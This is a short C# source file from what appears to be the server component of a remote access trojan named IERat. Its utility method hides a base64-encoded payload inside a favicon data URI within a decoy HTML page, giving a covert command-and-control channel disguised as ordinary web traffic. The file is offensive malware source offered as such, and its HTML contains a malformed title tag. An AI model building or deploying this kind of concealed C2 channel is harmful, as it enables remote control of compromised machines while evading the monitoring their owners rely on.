using System;
using System.Text;

namespace IERatServer.lib
{
    public class ServerUtils
    {
        public static string GenerateResponse(string payload)
        {
            string favicon = $"data:image/x-icon;base64,{Base64Encode(payload)}";
            return $"<html><head><link rel=\"icon\" href=\"{favicon}\" type=\"image/x-icon\"><title=\"IERat\"></title></head><body><h1>It's working!</h1></body></html>";
        }
        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
            return Convert.ToBase64String(plainTextBytes);
        }
    }
}
